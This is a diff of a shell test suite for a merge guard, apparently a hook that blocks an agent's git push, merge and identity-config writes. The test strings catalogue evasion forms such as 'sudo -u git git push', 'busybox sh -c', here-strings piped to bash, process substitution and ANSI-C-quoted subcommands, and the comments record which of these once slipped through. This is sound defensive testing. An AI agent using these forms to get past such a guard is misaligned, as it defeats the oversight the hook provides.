@@ -243,6 +243,94 @@ mg_both "xargs -n1 git push"               'xargs -n1 git push origin main'
 mg_both "a launcher in front of gh"        'timeout 30 gh pr merge 12'
 mg_both "two launchers stacked"            'sudo -u josh nice -n 10 git push origin main'
 
+# ============================================ AC-014/SEC-02/SEC-13 · the flag-VALUE dilemma
+# THE TWO HALVES BELOW MUST STAY IN ONE t_case, because they are the two horns of one dilemma and
+# the only wrong fix is to satisfy one at the other's expense.
+#
+# A launcher's flag VALUE can be spelled exactly like a command word. `git` is the conventional
+# service-account name (gitolite, gitea, forgejo, git-daemon), so `sudo -u git git push origin main`
+# is an ordinary phrasing, not an evasion — and it PERMITTED, because the command-word test ran
+# before the flag-value test: argv became ["git","git","push"], classify_git read sub="git", and
+# nothing matched. It also CHAINED: `sudo -u git git config --global user.email <v>` re-opened the
+# SEC-04 self-authorship route through the same hole. And SURFACE_COVERED claims "a launcher word
+# AND ITS OWN FLAGS AND FLAG VALUES ... `sudo -u josh` ... all resolve to the command they launch",
+# so `sudo -u josh git push` blocking while `sudo -u git git push` permitted was a FALSE COVERED
+# CLAIM — the exact defect the SEC-02 blocker was raised for.
+#
+# THE FIX IS NOT A REORDER, AND THIS BLOCK IS WHAT PROVES IT. The four value-LESS-flag forms in the
+# second half block *because* the command-word test wins (`-i`, `-p`, `-n`, `-19` take no value, so
+# the next token IS the command). Moving the flag-value branch above the command-word branch closes
+# the first half and RE-OPENS the second. There is no per-launcher table of which flags take a
+# value, so no ordering gets both right: launcher_argvs emits BOTH readings and classify_segment
+# gates if EITHER hits. A regression to either horn fails here.
+t_case "AC-014/SEC-13 a flag VALUE spelled like a command word is classified BOTH ways"
+mg_both "sudo -u git git push (the -u VALUE is 'git')" 'sudo -u git git push origin main'
+mg_both "sudo -u git git merge"            'sudo -u git git merge feature'
+mg_both "sudo -u \"git\" (quoted value)"   'sudo -u "git" git push origin main'
+mg_both "sudo -E -u git (a flag before it)" 'sudo -E -u git git push origin main'
+mg_both "sudo -g git (a different flag)"   'sudo -g git git push origin main'
+mg_both "doas -u git"                      'doas -u git git push origin main'
+mg_both "sudo -u sh (a SHELL name as the value)"  'sudo -u sh git push origin main'
+mg_both "sudo -u bash"                     'sudo -u bash git push origin main'
+mg_both "sudo -u zsh git merge"            'sudo -u zsh git merge feature'
+mg_both "sudo -u gh (gh as the value)"     'sudo -u gh git push origin main'
+mg_both "chained launchers, ambiguous in the middle" \
+                                           'nohup nice -n git timeout 60 git push origin main'
+# The chain back into SEC-04: the same hole re-authorised the guard's own identity axis.
+mg_both "sudo -u git git config --global user.email (re-opened SEC-04)" \
+                                           'sudo -u git git config --global user.email a@b.c'
+# EVERY launcher in the set that has a value-taking flag. The reviewer measured 12/12 permitting;
+# each gets its own assertion so no single one can regress quietly.
+mg_both "nice -n git"                      'nice -n git git push origin main'
+mg_both "env -u git"                       'env -u git git push origin main'
+mg_both "timeout -s git"                   'timeout -s git git push origin main'
+mg_both "xargs -a git"                     'xargs -a git git push origin main'
+mg_both "watch -n git"                     'watch -n git git push origin main'
+mg_both "stdbuf -o git"                    'stdbuf -o git git push origin main'
+mg_both "flock -E git"                     'flock -E git git push origin main'
+mg_both "taskset -c git"                   'taskset -c git git push origin main'
+mg_both "script -c git"                    'script -c git git push origin main'
+mg_both "ionice -c git"                    'ionice -c git git push origin main'
+mg_both "setpriv --reuid=git"              'setpriv --reuid=git git push origin main'
+mg_both "runuser -u git --"                'runuser -u git -- git push origin main'
+# ---- THE OTHER HORN. These block BECAUSE the token after a value-LESS flag IS the command word.
+# A naive reorder of the two branches re-opens every one of them. Verified: before the fix all four
+# blocked and all twelve above permitted; after it, all sixteen block.
+mg_both "env -i git push (the flag takes NO value)"  'env -i git push origin main'
+mg_both "command -p git push"              'command -p git push origin main'
+mg_both "sudo -n git push"                 'sudo -n git push origin main'
+mg_both "nice -19 git push (attached, no value)" 'nice -19 git push origin main'
+mg_both "sudo -E git push"                 'sudo -E git push origin main'
+mg_both "env -0 git push"                  'env -0 git push origin main'
+# ---- AND THE COST IS BOUNDED: the extra reading must not invent a match. `sudo -u git git status`
+# is the SAME ambiguous shape with a non-gated subcommand, and it must still cost nothing.
+t_case "AC-024/SEC-13 the second reading does not over-block (the shape alone is not a match)"
+for c in 'sudo -u git whoami' 'sudo -u git git status' 'sudo -u git git log --oneline' \
+         'env -u git ls' 'nice -n git ls' 'sudo -u sh sh -c "git status"' \
+         'sudo -u bash bash -c "echo git push is denied"'; do
+  assert_rc "not gated: $c" 0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$c"
+done
+# The ambiguity CAP fails closed. A prefix ambiguous in more than MAX_LAUNCHER_READINGS places is
+# cannot-evaluate (2), never a permit — a cap that DROPPED a reading would be a fail-open, which is
+# the whole point of emitting both readings in the first place.
+MANY_AMBIG="sudo"
+for _i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do MANY_AMBIG="$MANY_AMBIG -u git"; done
+assert_rc "a prefix ambiguous past the cap BLOCKS (cannot evaluate), never permits" 2 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$MANY_AMBIG git push origin main"
+assert_output "  and says why it could not resolve the command word" "ambiguous in more than" \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$MANY_AMBIG git push origin main"
+assert_rc "  and the same shape through the hook still blocks" 2 \
+  mg_hook "$TREE" "$GH_OK" "$REPO_BAD" "$MANY_AMBIG git push origin main"
+assert_ok "the cap constant is real and is the one the message names" python3 -c "
+import re
+src = open('$GUARD').read()
+m = re.search(r'^MAX_LAUNCHER_READINGS = (\d+)\$', src, re.M)
+assert m, 'MAX_LAUNCHER_READINGS is not defined, so the cap test above proves nothing'
+assert 'MAX_LAUNCHER_READINGS' in src.split('raise Cannot(\"the launcher prefix is ambiguous')[1][:200], \
+    'the cap is hard-coded in the message rather than read from the constant'
+print('ok', m.group(1))
+"
+
 t_case "AC-014/SEC-01 a shell's inline command flag is matched as a PATTERN, not a fixed list"
 mg_both "bash -ec '<push>'"                "bash -ec 'git push origin main'"
 mg_both "bash -xc '<push>'"                "bash -xc 'git push origin main'"
@@ -283,6 +371,102 @@ assert_rc "bash -s <<'EOF' body is scanned" 1 \
 git push origin main
 EOF"
 
+# ==================================================== AC-014/SEC-14 · multi-call shell dispatchers
+# `busybox`/`toybox` are ONE binary that dispatches on its first operand: `busybox sh -c '<cmd>'`
+# runs the shell. A previous wave added `busybox` to SHELLS, which made this WORSE than leaving it
+# out — classify_segment handed ["busybox","sh","-c","<cmd>"] to shell_inline, whose loop hit the
+# non-flag operand `sh`, concluded it was a script FILE and returned None. A name in WRAPPERS would
+# have been skipped past correctly. So the invariant is asserted, not just the behaviour: a
+# dispatcher belongs on the WRAPPERS side, and the two sets must not overlap.
+t_case "AC-014/SEC-14 a multi-call dispatcher resolves to the shell it dispatches to"
+mg_both "busybox sh -c '<push>'"           "busybox sh -c 'git push origin main'"
+mg_both "busybox ash -c '<push>'"          "busybox ash -c 'git push origin main'"
+mg_both "busybox sh -ec '<merge>'"         "busybox sh -ec 'git merge main'"
+mg_both "toybox sh -c '<push>'"            "toybox sh -c 'git push origin main'"
+mg_both "busybox sh <<< '<push>'"          "busybox sh <<< 'git push origin main'"
+mg_both "a launcher in front of the dispatcher" "sudo -u josh busybox sh -c 'git push origin main'"
+assert_rc "busybox with a NON-shell applet is not gated (no false positive)" 0 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'busybox ls -la'
+assert_ok "the dispatchers are in WRAPPERS, NOT in SHELLS, and the two sets are DISJOINT" python3 -c "
+import ast, re
+src = open('$GUARD').read()
+def tup(name):
+    m = re.search(r'^%s\s*=\s*(\(.*?\))' % name, src, re.M | re.S)
+    assert m, 'could not parse %s out of the guard' % name
+    return set(ast.literal_eval(m.group(1)))
+shells, multicall = tup('SHELLS'), tup('MULTICALL')
+# WRAPPERS is spelled as a literal tuple + MULTICALL, so evaluate just the literal part.
+m = re.search(r'^WRAPPERS = (\(.*?\))\s*\+\s*MULTICALL\s*\$', src, re.M | re.S)
+assert m, 'WRAPPERS is no longer literal-tuple + MULTICALL; re-check this assertion'
+wrappers = set(ast.literal_eval(m.group(1))) | multicall
+assert multicall, 'MULTICALL is empty, so nothing is being asserted'
+assert multicall <= wrappers, f'a dispatcher is not a launcher: {multicall - wrappers}'
+assert not (multicall & shells), (
+    f'{multicall & shells} is in SHELLS: shell_inline will read the APPLET NAME as a script file '
+    'and return None, which is exactly the SEC-14 bypass')
+assert not (shells & wrappers), f'SHELLS and WRAPPERS overlap: {shells & wrappers}'
+print('ok', sorted(multicall))
+"
+
+# ============================== AC-014/SEC-15 · here-strings piped onward, and process substitution
+# TWO ASYMMETRIES, both introduced by earlier fixes that stopped one token short.
+#  1. The heredoc path decides keep/drop with line_feeds_shell(line) — "ANY segment of the
+#     introducing line is a shell" — so `cat <<'EOF' | bash` is scanned. The HERE-STRING path did
+#     not get the same treatment: `here` operands were only consulted inside the `prog in SHELLS`
+#     branch of the segment that OWNED them, so `cat <<< '<cmd>' | bash` was never classified while
+#     the deliberately symmetric heredoc was. Both spellings run the same command.
+#  2. shlex lexes `<(` as one punctuation run containing `<`, so segments() read it as a
+#     REDIRECTION and dropped the following token as the "filename". `cat <(git push origin main)`
+#     therefore lost the `git` and left `push origin main` as the segment — a real push, with the
+#     command text fully inline and visible, which is NOT the declared script-FILE gap.
+t_case "AC-014/SEC-15 a here-string is a command string wherever the shell that eats it sits"
+mg_both "cat <<< '<push>' | bash (a LATER segment is the shell)" \
+                                           "cat <<< 'git push origin main' | bash"
+mg_both "cat <<< '<config write>' | sh"    "cat <<< 'git config --global user.email a@b.c' | sh"
+mg_both "cat <<< '<push>' | busybox sh"    "cat <<< 'git push origin main' | busybox sh"
+mg_both "printf %s <<< '<merge>' | zsh"    "printf %s <<< 'git merge feature' | zsh"
+# ...and the symmetric heredoc it was inconsistent with must still block, so this stays a PAIR.
+assert_rc "the symmetric heredoc form still blocks (the asymmetry is gone, both ways)" 1 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "cat <<'EOF' | bash
+git push origin main
+EOF"
+# NO FALSE POSITIVE: a here-string on a line with NO shell on it is just data.
+assert_rc "a here-string fed to a NON-shell is not classified" 0 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "cat <<< 'git push origin main' | grep -c push"
+assert_rc "  nor one fed to a non-shell with no pipe at all" 0 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "grep -c origin <<< 'git push origin main'"
+
+t_case "AC-014/SEC-15 a process substitution is a command boundary, not a redirection"
+mg_both "cat <(git push origin main)"      'cat <(git push origin main)'
+mg_both "diff <(git log) <(git push ...)"  'diff <(git log) <(git push origin main)'
+mg_both "tee >(git push origin main)"      'tee >(git push origin main)'
+mg_both "a config write inside <( )"       'cat <(git config --global user.email a@b.c)'
+mg_both "wc -l <(gh pr merge 12)"          'wc -l <(gh pr merge 12)'
+assert_rc "a benign process substitution is untouched" 0 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'diff <(sort a.txt) <(sort b.txt)'
+# The ordinary redirections the parens test now runs in front of must be unaffected.
+assert_rc "  and a LEADING redirection still resolves (the paren test did not eat it)" 1 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command '>/dev/null git push origin main'
+assert_rc "  and an fd-prefixed one still resolves" 1 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command '2>/tmp/e git merge main'
+assert_rc "  and a subshell still resolves" 1 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command '(cd /tmp && git push)'
+
+# ================================================= AC-014/SEC-16 · the identity-switching launchers
+# `su` sits directly beside `sudo` and `doas` in the launcher set's evident intent, and `su -c
+# '<cmd>'` additionally defeated the -c handling because `su` was not recognised as a launcher at
+# all. Every WRAPPERS name is already driven by the AC-019/SEC-02 loop below in its BARE form; these
+# assertions cover the flag forms that loop does not reach.
+t_case "AC-014/SEC-16 su and the other identity/namespace launchers resolve their command"
+mg_both "su - git -c '<push>'"             "su - git -c 'git push origin main'"
+mg_both "su -c '<push>' git"               "su -c 'git push origin main' git"
+mg_both "su -c '<config write>'"           "su -c 'git config --global user.email a@b.c'"
+mg_both "runuser -u git -- git push"       'runuser -u git -- git push origin main'
+mg_both "setpriv --reuid=1000 git push"    'setpriv --reuid=1000 git push origin main'
+mg_both "unshare -r git push"              'unshare -r git push origin main'
+mg_both "systemd-run --unit=x git push"    'systemd-run --unit=x git push origin main'
+mg_both "nsenter -a git push"              'nsenter -a git push origin main'
+
 # ======================================================== AC-014/SEC-03 · the QUOTING class
 # The shlex classifier resolves shell quoting correctly, but a raw-SUBSTRING prefilter ran first and
 # threw these away before the classifier ever saw them. The prefilter now deletes backslashes and
@@ -297,6 +481,34 @@ mg_both '"git" push (fully quoted)'         '"git" push origin main'
 mg_both "g\\h api -X PUT (a remote ref move)" 'g\h api -X PUT /repos/o/r/git/refs/heads/main -f sha=abc'
 mg_both "'gh' pr merge"                     "'gh' pr merge 12"
 mg_both "escaped subcommand: git me\\rge"   'git me\rge feature/x'
+
+# NOT FILED BY ANY REVIEW — found by driving the COVERED bullet itself, which says "shell QUOTING or
+# ESCAPING of the command word OR THE SUBCOMMAND ... `\$'git' push`". The normalisation that strips
+# the `\$`/`{`/quote decoration shlex leaves behind lived INSIDE prog_name, so it ran on the PROGRAM
+# word only. `\$'git' push` blocked; `git \$'push'`, `gh \$'pr' merge` and — worst — `git \$'config'
+# user.email <v>` PERMITTED. Same class as SEC-03, same class of false COVERED claim as SEC-02.
+# unquote() now runs wherever a token is compared against a fixed name.
+t_case "AC-014/SEC-03 ANSI-C quoting of the SUBCOMMAND, not just of the command word"
+mg_both "git \$'push' (quoted subcommand)"  "git \$'push' origin main"
+mg_both "git \$'merge'"                     "git \$'merge' feature/x"
+mg_both "git \$'pull'"                      "git \$'pull' origin main"
+mg_both "gh \$'pr' merge (quoted GROUP)"    "gh \$'pr' merge 12"
+mg_both "gh pr \$'merge' (quoted gh sub)"   "gh pr \$'merge' 12"
+mg_both "git \$'config' user.email <v>"     "git \$'config' --global user.email a@b.c"
+mg_both "git config \$'user.email' <v>"     "git config --global \$'user.email' a@b.c"
+mg_both "both words quoted"                 "\$'git' \$'push' origin main"
+mg_both "quoted git GLOBAL flag before it"  "git \$'--no-pager' push origin main"
+# `${push}` is a VARIABLE expansion, so this is deliberate OVER-blocking, not a closed bypass: the
+# same `{`-stripping has always applied to the command word (`${git} push`), and erring toward a
+# block on a variable named exactly `push` is the fail-closed direction. Asserted so it is a
+# recorded choice rather than an accident.
+mg_both "git \${push} — over-blocks on purpose" 'git ${push} origin main'
+mg_both "gh api \$'-X' PUT"                 "gh api \$'-X' PUT repos/o/r/pulls/1/update-branch"
+# The normalisation must not invent matches: these are NOT the gated subcommands.
+for c in "git \$'merge-base' main HEAD" "git \$'status'" "git \$'commit' -qm x" \
+         "git config --global \$'core.editor' vim" "gh \$'issue' comment 5"; do
+  assert_rc "not gated: $c" 0 mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$c"
+done
 
 t_case "AC-014 gh-based merge paths"
 assert_rc "gh pr merge"                            1 mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'gh pr merge'
@@ -592,6 +804,63 @@ assert_rc "python3 exits 1, hook mode -> 2 (blocks)" 2 \
 # The real refusal path must still report 1 through the wrapper — the 3->1 mapping is load-bearing.
 assert_rc "a REAL refusal is still reported as 1, not 3" 1 \
   mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'
+
+t_case "AC-015/AC-016/SEC-17 an exit CODE alone cannot author a decision — the sentinel must agree"
+# SEC-07 moved the refusal to process exit 3 so a broken interpreter's bare 1 could not be misread
+# as the decision "identity resolved and not allow-listed". That left the contract one code narrower
+# rather than closed: an interpreter that happens to exit 3 was still reported AS a refusal (SEC-17),
+# and — the half nobody filed, and the one that matters — an interpreter that exits 0 was reported as
+# a PERMIT. `python3` shims and wrappers are ordinary, and a `python3` that ignores stdin exits 0, so
+# a gated command could reach exit 0 without a line of the checker ever running. That is a FAIL-OPEN
+# on a control whose entire value is that it fails closed.
+#
+# The checker now prints a proof-of-execution sentinel on STDOUT and the wrapper honours 0 or 3 only
+# when it agrees. BOTH directions are asserted: the stub codes must block, and the REAL interpreter
+# must still be able to reach permit AND refuse (otherwise this test would pass on a guard that
+# simply blocked everything).
+PYEXIT0="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-pyexit0.XXXXXX")"; t_track "$PYEXIT0"
+printf '#!/bin/sh\nexit 0\n' > "$PYEXIT0/python3"; chmod +x "$PYEXIT0/python3"
+PYEXIT3="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-pyexit3.XXXXXX")"; t_track "$PYEXIT3"
+printf '#!/bin/sh\nexit 3\n' > "$PYEXIT3/python3"; chmod +x "$PYEXIT3/python3"
+PYQUIET="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-pyquiet.XXXXXX")"; t_track "$PYQUIET"
+printf '#!/bin/sh\ncat >/dev/null\nexit 0\n' > "$PYQUIET/python3"; chmod +x "$PYQUIET/python3"
+assert_rc "python3 exits 0 with no sentinel -> 2, NOT 0 (this was a FAIL-OPEN)" 2 \
+  mg "$TREE" "$PYEXIT0" "$REPO_OK" --command 'git push origin main'
+assert_rc "  and through the hook it BLOCKS" 2 \
+  mg_hook "$TREE" "$PYEXIT0" "$REPO_OK" 'git push origin main'
+assert_rc "a python3 that swallows the program and exits 0 -> 2" 2 \
+  mg "$TREE" "$PYQUIET" "$REPO_OK" --command 'git push origin main'
+assert_rc "python3 exits 3 with no sentinel -> 2, NOT 1 (SEC-17)" 2 \
+  mg "$TREE" "$PYEXIT3" "$REPO_OK" --command 'git push origin main'
+assert_output "  and says the exit could not be read as a decision" \
+  "did not emit its proof-of-execution sentinel" \
+  mg "$TREE" "$PYEXIT3" "$REPO_OK" --command 'git push origin main'
+assert_output "  and names which decision that code would have meant" 'would mean "refuse"' \
+  mg "$TREE" "$PYEXIT3" "$REPO_OK" --command 'git push origin main'
+assert_output "  and the 0 case names the permit it refused to honour" 'would mean "permit"' \
+  mg "$TREE" "$PYEXIT0" "$REPO_OK" --command 'git push origin main'
+assert_output "  and says nothing was recorded in the ledger" "nothing was recorded in the" \
+  mg "$TREE" "$PYEXIT0" "$REPO_OK" --command 'git push origin main'
+# CONTROL: with the real python3, both decisions are still reachable. Without these, the four
+# assertions above would also pass on a guard that had simply stopped permitting anything.
+assert_rc "control: the REAL checker can still reach permit (0)" 0 \
+  mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git push origin main'
+assert_rc "control: the REAL checker can still reach refuse (1)" 1 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'
+assert_rc "control: and cannot-evaluate (2) needs no sentinel" 2 \
+  mg "$TREE" "$GH_UNAUTH" "$REPO_OK" --command 'git push origin main'
+# The sentinel is on STDOUT, so stderr — which carries the block message to the agent — is untouched.
+assert_output "the human-readable block message still reaches stderr verbatim" \
+  "identity NOT authorised" mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main'
+assert_eq "and the sentinel is NOT leaked onto the caller's stdout" "" \
+  "$(mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'git push origin main' 2>/dev/null)"
+assert_eq "  nor on a permit" "" \
+  "$(mg "$TREE" "$GH_OK" "$REPO_OK" --command 'git push origin main' 2>/dev/null)"
+assert_eq "  nor through the hook adapter" "" \
+  "$(mg_hook "$TREE" "$GH_OK" "$REPO_BAD" 'git push origin main' 2>/dev/null)"
+# --surface writes a REPORT on stdout, so it must not emit a sentinel there.
+assert_not_output "--surface does not print the sentinel" "FIRM_MG_DECISION" \
+  mg_env "$TREE" "$PATH" "$REPO_OK" --surface
 
 t_case "AC-016/SEC-08 --command with no value is cannot-evaluate, not an authorisation"
 # `firm-merge-guard --command \"\$CMD\"` with an unset variable used to yield exit 0. Every other
@@ -931,6 +1200,145 @@ hook_explode() { ( cd "$REPO_OK" && printf '%s' "$(mk_payload "$1")" | PATH="$EX
 assert_rc "hook + benign command -> 0" 0 hook_explode 'ls -la'
 assert_eq "hook + benign command spawned no gh/git/python3" "" "$(hook_explode 'ls -la' 2>&1)"
 
+# ============ AC-022/AC-015/SEC-02 · THE TWO PREFILTERS ARE PINNED TO EACH OTHER
+# WHY THIS IS THE MOST IMPORTANT TEST IN THIS FILE. There are TWO prefilters — a bash one
+# (`_mg_may_match`) and a jq one embedded in the hook adapter — and they are not interchangeable:
+# the jq one is used when jq is present, the BASH one is what hook mode falls back to when jq is
+# ABSENT, which the script explicitly supports. So a clause present in one and missing from the
+# other is not a style inconsistency, it is a per-host difference in what the gate covers.
+#
+# That is not hypothetical. An uncommitted change removed the `git`+`config` clause from
+# `_mg_may_match` ONLY, leaving the jq copy intact. On a host with jq nothing looked wrong; on a
+# jq-less host it deleted the entire SEC-04 identity-write gate from the ENFORCEMENT surface,
+# because a SKIP verdict exits 0 before python3 is ever reached. A fail-open, invisible on the
+# machine it was written on, and no test could see it. The diff is kept at
+# 09-test-evidence/wo-c-discarded-wip-config-prefilter-revert.diff.
+#
+# So both prefilters are EXTRACTED FROM THE SHIPPED SCRIPT (not re-implemented here — a copy would
+# drift and prove nothing) and driven over one fixed corpus. Three properties are asserted:
+#   1. Each prefilter gives the verdict the table declares. A clause deleted from EITHER side flips
+#      rows to SKIP and fails; a clause loosened flips benign rows to CHECK and fails.
+#   2. Every row marked `gated` is CHECK in BOTH — no prefilter may drop a command the classifier
+#      gates — AND the guard really does gate it. That second half is what stops the table itself
+#      from being edited to hide a hole: weaken a `gated` row's expectation to SKIP and the guard
+#      assertion on the same row goes red.
+#   3. NO row is CHECK in bash but SKIP in jq. jq is the surface that runs when jq exists, so it
+#      must never be the weaker of the two. The reverse (jq stricter) is allowed, and the only
+#      rows where it happens are declared `divergent` below with the reason.
+t_case "AC-022/SEC-02 the bash and jq prefilters agree on a fixed corpus"
+assert_ok "precondition: jq IS on PATH (without it this whole case would prove only half)" \
+  sh -c 'command -v jq'
+PFDIR="$(mktemp -d "${TMPDIR:-/tmp}/firm-mg-prefilter.XXXXXX")"; t_track "$PFDIR"
+assert_ok "both prefilters can be extracted from the SHIPPED script (not re-implemented here)" \
+  python3 -c "
+import re
+src = open('$GUARD').read()
+m = re.search(r'^_mg_may_match\(\) \{\n(.*?)^\}\$', src, re.S | re.M)
+assert m, 'could not extract _mg_may_match from the guard'
+open('$PFDIR/may.sh', 'w').write(
+    '#!/usr/bin/env bash\n_mg_may_match() {\n' + m.group(1) + '}\n'
+    'if _mg_may_match \"\$1\"; then echo CHECK; else echo SKIP; fi\n')
+j = re.search(r\"\| jq -r '\n(.*?)'\s*2>/dev/null\", src, re.S)
+assert j, 'could not extract the jq prefilter program from the guard'
+prog = j.group(1)
+assert 'tool_input' in prog and 'SKIP' in prog and 'CHECK' in prog, prog[:200]
+open('$PFDIR/pre.jq', 'w').write(prog)
+"
+PF_BAD_DIRECTION=0
+# pf_row <kind> <expect-bash> <expect-jq> <string>
+pf_row() {
+  local kind="$1" eb="$2" ej="$3" s="$4" ab aj
+  ab="$(bash "$PFDIR/may.sh" "$s" 2>/dev/null)"
+  aj="$(printf '%s' "$(mk_payload "$s")" | jq -r -f "$PFDIR/pre.jq" 2>/dev/null || printf 'CHECK')"
+  assert_eq "prefilter[bash] wants $eb · $kind · $s" "$eb" "$ab"
+  assert_eq "prefilter[jq]   wants $ej · $kind · $s" "$ej" "$aj"
+  if [ "$ab" = "CHECK" ] && [ "$aj" = "SKIP" ]; then
+    PF_BAD_DIRECTION=$((PF_BAD_DIRECTION+1))
+    _t_no "jq is WEAKER than the bash fallback for: $s" \
+          "jq runs whenever jq exists, so it must never SKIP what bash would CHECK"
+  fi
+  if [ "$kind" = "gated" ]; then
+    assert_eq "  gated rows must be CHECK in BOTH (neither may drop a gated command) · $s" \
+      "CHECK CHECK" "$eb $ej"
+    assert_rc "  ...and the guard really gates it, so the row above cannot be edited to hide it" 1 \
+      mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$s"
+  fi
+}
+# ---- GATED. Every one of these is asserted to BLOCK elsewhere in this file. Both prefilters must
+# let them through to the classifier. `git config --global user.email ...` is the exact string the
+# discarded WIP would have SKIPped in bash while jq still CHECKed it.
+pf_row gated  CHECK CHECK 'git push origin main'
+pf_row gated  CHECK CHECK 'git merge feature'
+pf_row gated  CHECK CHECK 'git pull origin main'
+pf_row gated  CHECK CHECK 'gh pr merge 12'
+pf_row gated  CHECK CHECK 'git config --global user.email attacker@example.com'
+pf_row gated  CHECK CHECK 'git config user.email a@b.c'
+pf_row gated  CHECK CHECK 'git config set user.email a@b.c'
+pf_row gated  CHECK CHECK 'git config --unset user.email'
+pf_row gated  CHECK CHECK 'git -C /tmp/other config user.email a@b.c'
+pf_row gated  CHECK CHECK '/usr/bin/git --no-pager config --global user.name Somebody'
+pf_row gated  CHECK CHECK "git \$'config' --global user.email a@b.c"
+pf_row gated  CHECK CHECK "git 'con'fig user.email a@b.c"
+pf_row gated  CHECK CHECK "bash -ec 'git config --global user.email a@b.c'"
+pf_row gated  CHECK CHECK 'sudo -u git git config --global user.email a@b.c'
+pf_row gated  CHECK CHECK 'git pus\h origin main'
+pf_row gated  CHECK CHECK 'gh api -XPUT repos/o/r/git/refs/heads/main'
+pf_row gated  CHECK CHECK 'git subtree push --prefix=d origin main'
+pf_row gated  CHECK CHECK 'cat <(git push origin main)'
+pf_row gated  CHECK CHECK "busybox sh -c 'git push origin main'"
+# ---- BENIGN, and on the zero-subprocess path in BOTH. These are the AC-022 win: the ordered
+# `git`-then-`config` clause returns them here. Before it, every one containing both words in ANY
+# order cost a python3 start (~40 ms, doubled by the two hook registrations).
+pf_row benign SKIP  SKIP  'ls -la'
+pf_row benign SKIP  SKIP  'cat README.md'
+pf_row benign SKIP  SKIP  'echo hello'
+pf_row benign SKIP  SKIP  'git status --porcelain'
+pf_row benign SKIP  SKIP  'git log --oneline -5'
+pf_row benign SKIP  SKIP  'git add -A'
+pf_row benign SKIP  SKIP  'git commit -qm seed'
+pf_row benign SKIP  SKIP  'git diff --stat'
+pf_row benign SKIP  SKIP  'grep -rn config .github/'
+pf_row benign SKIP  SKIP  'cat docs/config.md'
+pf_row benign SKIP  SKIP  'python3 -c "import configparser"'
+pf_row benign SKIP  SKIP  'cat .github/workflows/ci.yml'
+pf_row benign SKIP  SKIP  'ls config git'
+pf_row benign SKIP  SKIP  'echo GitHub'
+pf_row benign SKIP  SKIP  'sed -i "" s/a/b/ file.txt'
+pf_row benign SKIP  SKIP  'awk -F, "{print \$1}" data.csv'
+# ---- STILL CHECK, and honestly so. `git` DOES precede `config` here, so the ordered clause cannot
+# tell these from a real `git ... config` write without a parse. They cost one python3 start and are
+# then resolved to PERMIT structurally. Narrowing further — e.g. demanding whitespace before
+# `config` — would SKIP `git \$'config' user.email <v>`, which IS gated. The clause errs toward
+# CHECK, which costs milliseconds; erring the other way costs the gate.
+pf_row benign CHECK CHECK 'cat .git/config'
+pf_row benign CHECK CHECK 'ls -la ~/.gitconfig'
+pf_row benign CHECK CHECK 'git config --get user.email'
+# ---- DECLARED DIVERGENCES. jq is the STRICTER side in both, which is the safe direction: it runs
+# whenever jq is present. Listed so that any NEW divergence — in either direction — fails above.
+#   · jq tests bare `gh` case-insensitively; bash requires `gh ` or `gh<TAB>`. So "high" CHECKs in jq.
+#   · jq's push|merge|pull test is case-insensitive; bash enumerates only push/Push/PUSH.
+# Neither can be fixed cheaply on the bash side: bash 3.2 has no `${v,,}` and lowercasing costs a
+# subprocess, which is the one thing this prefilter exists to avoid.
+pf_row divergent SKIP CHECK 'echo "effort level high"'
+pf_row divergent SKIP CHECK 'echo pUsh'
+pf_row divergent SKIP CHECK 'echo MeRgE'
+assert_eq "NO corpus row has jq weaker than the bash fallback (checked on every row above)" \
+  "0" "$PF_BAD_DIRECTION"
+# And the ordered clause is really ordered, in BOTH copies — asserted on the source as well as on
+# behaviour, because "config before git" is the property the tightening turns on.
+assert_ok "both copies of the git/config clause require git BEFORE config" python3 -c "
+import re
+src = open('$GUARD').read()
+bash_fn = re.search(r'^_mg_may_match\(\) \{\n(.*?)^\}\$', src, re.S | re.M).group(1)
+assert '*git*config*' in bash_fn, 'the bash clause is not the ordered form: ' + bash_fn
+assert '*config*' not in bash_fn.replace('*git*config*', ''), (
+    'an unordered *config* clause is back in _mg_may_match: ' + bash_fn)
+jq = re.search(r\"\| jq -r '\n(.*?)'\s*2>/dev/null\", src, re.S).group(1)
+assert re.search(r'test\(\"git\[.*?\]\*config\"\)', jq), 'the jq clause is not the ordered form: ' + jq
+assert 'test(\"config\")' not in jq, 'an unordered config test is back in the jq program'
+print('ok')
+"
+
 # ============================================================ AC-023 · the ledger hook survives
 t_case "AC-023 the pre-existing PreToolUse ledger behaviour is unchanged"
 HREPO="$(mk_repo)"
@@ -1094,6 +1502,27 @@ assert_output "the launcher set is printed in full, and labelled a name list" \
   "the launcher set, in full (a NAME LIST, not a rule)" surface_text
 assert_output "GAPS says every gap line has its own PERMIT assertion" \
   "each line has its own PERMIT assertion" surface_text
+# ---- the claims this wave ADDED. Each one is driven by an assertion above; pinned here so the
+# printed document and the behaviour cannot come apart in either direction.
+assert_output "COVERED states the flag-VALUE case, in BOTH readings" \
+  "a launcher flag VALUE that is itself spelled like a command word, in EITHER reading" surface_text
+assert_output "  and names the sudo -u git form specifically" "sudo -u git git push" surface_text
+assert_output "  and says which way ambiguity resolves" "Ambiguity resolves toward blocking." surface_text
+assert_output "COVERED states the multi-call dispatcher case" "busybox sh -c" surface_text
+assert_output "COVERED states the here-string-piped-onward case" \
